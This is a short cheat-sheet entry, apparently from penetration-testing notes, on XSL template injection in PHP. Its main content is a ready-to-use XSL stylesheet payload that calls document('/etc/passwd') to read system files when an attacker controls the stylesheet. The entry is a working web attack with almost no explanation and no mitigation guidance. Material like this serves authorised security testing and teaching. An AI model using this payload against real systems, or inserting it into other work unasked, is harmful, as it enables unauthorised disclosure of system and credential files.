# PHP XSL Template Injection

If you can control the XSL file in a PHP application you can potentially read file contents through error messages  

```xsl
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
<xsl:template match="/">
        <xsl:copy-of select="document('/etc/passwd')"/>
</xsl:template>
</xsl:stylesheet>
```
